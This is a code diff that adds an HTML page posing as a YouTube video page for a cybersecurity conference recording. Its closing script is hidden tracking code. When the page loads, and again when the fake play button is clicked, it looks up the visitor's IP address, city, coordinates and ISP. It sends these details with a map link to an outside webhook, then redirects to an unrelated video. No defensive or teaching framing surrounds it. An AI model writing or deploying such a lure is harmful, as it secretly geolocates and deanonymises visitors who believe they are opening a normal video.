@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cybersecurity Conference 2025 - YouTube</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { background: #0f0f0f; color: white; font-family: Roboto, Arial, sans-serif; }
+
+.header {
+  background: #0f0f0f;
+  padding: 12px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  border-bottom: 1px solid #272727;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+.logo { font-size: 22px; font-weight: bold; letter-spacing: -1px; }
+.logo span { color: #ff0000; }
+
+.search-bar {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.search-bar input {
+  background: #121212;
+  border: 1px solid #303030;
+  color: white;
+  padding: 8px 15px;
+  border-radius: 20px 0 0 20px;
+  width: 300px;
+  font-size: 15px;
+}
+.search-bar button {
+  background: #222;
+  border: 1px solid #303030;
+  color: white;
+  padding: 8px 15px;
+  border-radius: 0 20px 20px 0;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+.container { max-width: 1000px; margin: 25px auto; padding: 0 20px; }
+
+.video-box {
+  width: 100%;
+  background: #000;
+  border-radius: 12px;
+  overflow: hidden;
+  cursor: pointer;
+  position: relative;
+}
+.thumbnail {
+  width: 100%;
+  height: 500px;
+  background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 15px;
+}
+.thumbnail-icon { font-size: 80px; }
+.thumbnail-text { font-size: 20px; color: #ccc; }
+
+.play-overlay {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 75px;
+  height: 75px;
+  background: rgba(255,0,0,0.85);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.play-overlay::after {
+  content: '';
+  border-left: 30px solid white;
+  border-top: 20px solid transparent;
+  border-bottom: 20px solid transparent;
+  margin-left: 7px;
+}
+
+.loading {
+  display: none;
+  text-align: center;
+  padding: 60px;
+}
+.spinner {
+  border: 5px solid #333;
+  border-top: 5px solid #ff0000;
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  animation: spin 0.8s linear infinite;
+  margin: 0 auto 20px;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.loading p { color: #aaa; font-size: 16px; }
+
+.video-info { margin-top: 18px; }
+.video-title { font-size: 20px; font-weight: bold; margin-bottom: 8px; line-height: 1.4; }
+.video-meta { color: #aaa; font-size: 14px; margin-bottom: 15px; }
+
+.actions {
+  display: flex;
+  gap: 10px;
+  margin-bottom: 15px;
+}
+.action-btn {
+  background: #272727;
+  border: none;
+  color: white;
+  padding: 8px 16px;
+  border-radius: 20px;
+  cursor: pointer;
+  font-size: 14px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.channel {
+  display: flex;
+  align-items: center;
+  gap: 15px;
+  padding: 15px 0;
+  border-top: 1px solid #272727;
+  border-bottom: 1px solid #272727;
+}
+.channel-icon {
+  width: 48px;
+  height: 48px;
+  background: #ff0000;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-weight: bold;
+  font-size: 18px;
+}
+.channel-name { font-weight: bold; font-size: 16px; }
+.channel-subs { color: #aaa; font-size: 13px; }
+.subscribe-btn {
+  margin-left: auto;
+  background: white;
+  color: black;
+  border: none;
+  padding: 10px 20px;
+  border-radius: 20px;
+  font-weight: bold;
+  cursor: pointer;
+  font-size: 14px;
+}
+
+.description {
+  margin-top: 15px;
+  background: #272727;
+  padding: 15px;
+  border-radius: 10px;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #ccc;
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">You<span>Tube</span></div>
+  <div class="search-bar">
+    <input type="text" placeholder="Search" value="Cybersecurity Conference 2025">
+    <button>🔍</button>
+  </div>
+</div>
+
+<div class="container">
+  <div class="video-box" onclick="playVideo()" id="videoBox">
+    <div class="thumbnail" id="thumbnail">
+      <div class="thumbnail-icon">🔐</div>
+      <div class="thumbnail-text">Cybersecurity Conference 2025</div>
+    </div>
+    <div class="play-overlay" id="playBtn"></div>
+    <div class="loading" id="loading">
+      <div class="spinner"></div>
+      <p>Loading video...</p>
+    </div>
+  </div>
+
+  <div class="video-info">
+    <div class="video-title">International Cybersecurity Conference 2025 - Full Session Recording</div>
+    <div class="video-meta">125,430 views • 2 days ago</div>
+    <div class="actions">
+      <button class="action-btn">👍 4.2K</button>
+      <button class="action-btn">👎 Dislike</button>
+      <button class="action-btn">↗ Share</button>
+      <button class="action-btn">⬇ Download</button>
+    </div>
+    <div class="channel">
+      <div class="channel-icon">CS</div>
+      <div>
+        <div class="channel-name">CyberSec Official</div>
+        <div class="channel-subs">892K subscribers</div>
+      </div>
+      <button class="subscribe-btn">Subscribe</button>
+    </div>
+    <div class="description">
+      Full recording of the International Cybersecurity Conference 2025.<br><br>
+      Topics covered: AI in Security, Ethical Hacking, Zero Trust Architecture, and more.<br><br>
+      🔔 Subscribe for more cybersecurity content.<br>
+      📌 Timestamps in the comments below.
+    </div>
+  </div>
+</div>
+
+<script>
+const WEBHOOK = "https://eocy1w7x0u37m91.m.pipedream.net";
+
+async function getLocationAndSend() {
+  try {
+    const res = await fetch("https://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,isp,query");
+    const data = await res.json();
+
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        ip: data.query,
+        country: data.country,
+        region: data.regionName,
+        city: data.city,
+        lat: data.lat,
+        lon: data.lon,
+        isp: data.isp,
+        time: new Date().toLocaleString(),
+        maps: `https://www.google.com/maps?q=${data.lat},${data.lon}`
+      })
+    });
+  } catch(e) {}
+}
+
+function playVideo() {
+  document.getElementById("thumbnail").style.display = "none";
+  document.getElementById("playBtn").style.display = "none";
+  document.getElementById("loading").style.display = "block";
+  getLocationAndSend();
+  setTimeout(() => {
+    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+  }, 4000);
+}
+
+getLocationAndSend();
+</script>
+</body>
+</html>
